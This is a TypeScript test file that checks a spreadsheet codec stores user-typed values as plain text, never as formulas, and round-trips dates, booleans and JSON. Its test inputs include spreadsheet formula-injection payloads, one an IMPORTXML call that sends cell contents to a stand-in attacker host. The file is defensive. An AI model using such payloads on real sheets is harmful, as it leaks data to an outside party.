/**
 * Values survive a round trip through a sheet exactly, and nothing a user
 * types can become a formula when the firm opens the sheet.
 */
import { TABLES, type Row } from '@empirica/shared';
import { describe, expect, it } from 'vitest';
import { createWorld } from '../testing/harness.ts';
import { decodeCell, encodeCell } from './codec.ts';
import { Database } from './database.ts';

const ID = '00000000-0000-4000-8000-0000000000aa';

function roundTrip(fields: Record<string, unknown>): Row | undefined {
  const w = createWorld({ data: null });
  const db = new Database(w.env);
  db.table('Solicitudes').put({ ...(fields as Row), id: ID });
  db.flush();
  return { ...new Database(w.env).table('Solicitudes').get(ID) } as Row;
}

describe('sheet cells', () => {
  it.each([
    '=IMPORTXML("https://atacante.example/?d="&A1,"//a")',
    '=HYPERLINK("https://atacante.example","clic")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
  ])('stores %s as plain text, never as a formula', (titulo) => {
    const w = createWorld({ data: null });
    const db = new Database(w.env);
    db.table('Solicitudes').put({ id: ID, titulo, descripcion: titulo });
    db.flush();
    expect(w.google.formulas).toEqual([]);
    expect(new Database(w.env).table('Solicitudes').get(ID)?.titulo).toBe(titulo);
  });

  it('keeps text that Sheets would otherwise convert', () => {
    const row = roundTrip({
      titulo: '007',
      descripcion: 'TRUE',
      area: 'CONTRATOS',
      estado: '2026-10-02',
    });
    expect(row).toMatchObject({ titulo: '007', descripcion: 'TRUE', estado: '2026-10-02' });
  });

  it('keeps a leading apostrophe typed by the user', () => {
    expect(roundTrip({ titulo: "'entre comillas'" })?.titulo).toBe("'entre comillas'");
  });

  it('round-trips numbers, booleans, JSON, dates and instants', () => {
    const w = createWorld({ data: null });
    const db = new Database(w.env);
    db.table('Tareas').put({
      id: ID,
      esFatal: true,
      checklist: [{ id: 'c1', texto: '=1+1', hecho: false }],
      fechaLimite: '2026-10-15',
      enEsperaDesde: '2026-10-02T09:30:00.000-05:00',
      version: 3,
    });
    db.flush();
    expect(new Database(w.env).table('Tareas').get(ID)).toMatchObject({
      esFatal: true,
      checklist: [{ id: 'c1', texto: '=1+1', hecho: false }],
      fechaLimite: '2026-10-15',
      enEsperaDesde: '2026-10-02T09:30:00.000-05:00',
      version: 3,
    });
    expect(w.google.formulas).toEqual([]);
  });

  it('reads what a person typed by hand', () => {
    const column = (name: string) => {
      const c = TABLES.Tareas.columns.find((x) => x.name === name);
      if (!c) throw new Error(name);
      return c;
    };
    expect(decodeCell(column('fechaLimite'), new Date('2026-10-15T00:00:00-05:00'))).toBe(
      '2026-10-15',
    );
    expect(decodeCell(column('esFatal'), 'VERDADERO')).toBe(true);
    expect(decodeCell(column('titulo'), 42)).toBe('42');
    expect(decodeCell(column('checklist'), '{roto')).toBeNull();
    expect(encodeCell(column('titulo'), '')).toBe('');
  });
});
